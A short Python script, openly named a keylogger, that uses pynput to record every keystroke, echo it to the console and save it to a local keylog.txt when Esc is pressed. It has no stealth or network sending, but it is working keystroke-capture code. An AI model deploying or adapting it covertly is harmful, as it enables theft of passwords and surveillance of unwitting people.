# keylogger.py
import pynput
from pynput.keyboard import Key, Listener
keys = []
def on_press(key):
    try:
        # Append the pressed key to the list
        keys.append(key.char)
        print(f"Key pressed: {key.char}")
    except AttributeError:
        # Handle special keys (e.g., Shift, Ctrl, etc.)
        keys.append(str(key))
        print(f"Special key pressed: {key}")
def on_release(key):
    if key == Key.esc:
        # Stop the keylogger when the user presses the 'Esc' key
        write_to_file()
        return False
def write_to_file():
    # Write the captured keys to a log file
    with open("keylog.txt", "w") as f:
        for key in keys:
            f.write(str(key) + "\n")
if __name__ == "__main__":
    print("Keylogger started. Press 'Esc' to stop.")
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()